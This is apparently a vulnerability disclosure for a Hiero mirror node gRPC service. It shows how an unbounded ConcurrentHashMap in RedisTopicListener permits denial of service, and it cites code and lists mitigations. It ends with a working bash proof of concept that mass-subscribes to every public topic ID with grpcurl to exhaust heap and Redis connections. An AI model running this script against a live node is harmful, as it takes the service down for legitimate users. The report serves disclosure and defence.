### Title
Unbounded `topicMessages` ConcurrentHashMap Growth in `RedisTopicListener` Enables Heap/Redis-Connection Exhaustion DoS

### Summary
`RedisTopicListener.getSharedListener()` inserts one `Flux<TopicMessage>` entry into the `topicMessages` `ConcurrentHashMap` for every distinct topic ID that receives a live subscription, with no cap on the map's size. Because the gRPC endpoint requires no authentication and imposes no global limit on concurrent connections or total active subscriptions, an unprivileged attacker can open arbitrarily many connections—each subscribing to a different valid topic ID—causing the map and its backing Redis channel subscriptions to grow until heap or Redis connection resources are exhausted.

### Finding Description

**Exact code path**

`RedisTopicListener.java`, `getSharedListener()`, lines 59–62:
```java
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
```
`topicMessages` is declared at line 33 and instantiated at line 43 as a plain, unbounded `ConcurrentHashMap<String, Flux<TopicMessage>>`.

`getTopic()` (lines 64–66) maps each `topicId` to the string key `"topic.<id>"`. Every distinct numeric topic ID therefore produces a distinct map entry.

`subscribe()` (lines 68–80) opens a real Redis channel subscription for each new key and wraps it in a `.share()` Flux. Cleanup (`unsubscribe`, lines 82–85) only fires via `doOnCancel` / `doOnComplete`, i.e., only when the **last** subscriber to that topic disconnects. While a single subscriber is alive, the entry and its Redis connection remain.

**Root cause / failed assumption**

The design assumes the number of concurrently subscribed distinct topics is small and self-limiting. There is no:
- cap on `topicMessages.size()`,
- global limit on total concurrent gRPC subscriptions (only `maxConcurrentCallsPerConnection = 5` per individual connection, not across all connections),
- rate limit on new subscription requests per client IP.

**Exploit flow**

1. Attacker enumerates valid topic IDs (all are publicly visible on-chain; `checkTopicExists = true` by default, so only existing topics work—but thousands to millions exist on mainnet/testnet).
2. Attacker opens C connections, each issuing 5 concurrent `subscribeTopic` RPCs to distinct topic IDs (5 per connection × C connections = 5C active subscriptions).
3. Each unique topic ID triggers `computeIfAbsent` → `subscribe()` → one new Redis channel subscription + one `Flux` object inserted into `topicMessages`.
4. As long as at least one attacker connection per topic remains open, the entry is never removed.
5. With enough connections the JVM heap fills with `Flux` objects, `ConcurrentHashMap` internal structures, and Reactor operator chains; simultaneously Redis exhausts its connection/subscription limits.

**Why existing checks are insufficient**

- `checkTopicExists = true`: Requires valid topic IDs, but does not bound the number of simultaneous subscriptions. Valid topics are public knowledge.
- `maxConcurrentCallsPerConnection = 5`: Limits calls per TCP connection, not total connections. An attacker opens many connections.
- `maxBufferSize` / `prefetch`: Govern message buffering per subscriber, not the number of Redis channel subscriptions.
- No IP-level connection throttle or global subscription counter is present in the application layer.

### Impact Explanation
Each entry in `topicMessages` holds a live Redis pub/sub channel subscription and a Reactor operator chain. With thousands of entries the JVM heap is progressively consumed; Redis may also hit its `maxclients` or subscription limits. Either path results in an OutOfMemoryError or Redis connection refusal, taking down the gRPC service for all legitimate users. Because the gRPC mirror node is the primary real-time HCS data feed, its unavailability directly impacts any application relying on topic message streaming.

### Likelihood Explanation
The gRPC endpoint is publicly reachable with no authentication. Topic IDs are enumerable from the public mirror REST API (`/api/v1/topics`). A single attacker machine can open hundreds of TCP connections and issue thousands of `subscribeTopic` RPCs in seconds using standard gRPC tooling (e.g., `grpcurl`, any gRPC client library). The attack is repeatable and requires no special privileges or insider knowledge.

### Recommendation
1. **Cap the map size**: Enforce a configurable maximum on `topicMessages.size()` (e.g., via a `LinkedHashMap` with eviction or an explicit size check before `computeIfAbsent`).
2. **Global subscription limit**: Add an `AtomicInteger` tracking total active live subscriptions; reject new ones above a configurable threshold.
3. **Per-IP / per-connection subscription limit**: Track and enforce a maximum number of concurrent subscriptions originating from a single client.
4. **Idle-subscription timeout**: Automatically cancel and remove map entries for topics that have received no messages within a configurable window.
5. **Infrastructure-level rate limiting**: Deploy a gRPC-aware proxy (e.g., Envoy) that enforces per-IP connection and RPC rate limits upstream of the application.

### Proof of Concept
```bash
# Enumerate valid topic IDs from the public REST API
curl -s "https://<mirror-node>/api/v1/topics?limit=1000" | jq -r '.topics[].topic_id' > topics.txt

# Open one persistent subscribeTopic RPC per topic ID (background each call)
while read TOPIC; do
  SHARD=$(echo $TOPIC | cut -d. -f1)
  REALM=$(echo $TOPIC | cut -d. -f2)
  NUM=$(echo $TOPIC | cut -d. -f3)
  grpcurl -plaintext \
    -d "{\"topicID\":{\"shardNum\":$SHARD,\"realmNum\":$REALM,\"topicNum\":$NUM}}" \
    <grpc-host>:5600 \
    com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
done < topics.txt

# Each background process keeps its subscription alive.
# topicMessages grows by one entry per unique topic.
# Monitor JVM heap and Redis connection count to observe exhaustion.
wait
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L33-43)
```java
    private final Map<String, Flux<TopicMessage>> topicMessages; // Topic name to active subscription

    public RedisTopicListener(
            ListenerProperties listenerProperties,
            ObservationRegistry observationRegistry,
            ReactiveRedisConnectionFactory connectionFactory,
            RedisSerializer<TopicMessage> redisSerializer) {
        super(listenerProperties);
        this.channelSerializer = SerializationPair.fromSerializer(RedisSerializer.string());
        this.messageSerializer = SerializationPair.fromSerializer(redisSerializer);
        this.topicMessages = new ConcurrentHashMap<>();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L59-62)
```java
    protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
        Topic topic = getTopic(filter);
        return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L64-66)
```java
    private Topic getTopic(TopicMessageFilter filter) {
        return ChannelTopic.of(String.format("topic.%d", filter.getTopicId().getId()));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L68-80)
```java
    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L82-85)
```java
    private void unsubscribe(Topic topic) {
        topicMessages.remove(topic.getTopic());
        log.info("Unsubscribing from {}", topic);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L17-43)
```java
public class ListenerProperties {

    private boolean enabled = true;

    @Min(8192)
    @Max(65536)
    private int maxBufferSize = 16384;

    @Min(32)
    private int maxPageSize = 5000;

    @DurationMin(millis = 50)
    @NotNull
    private Duration interval = Duration.ofMillis(500L);

    @Min(4)
    @Max(256)
    private int prefetch = 48;

    @NotNull
    private ListenerType type = ListenerType.REDIS;

    public enum ListenerType {
        POLL,
        REDIS,
        SHARED_POLL
    }
```
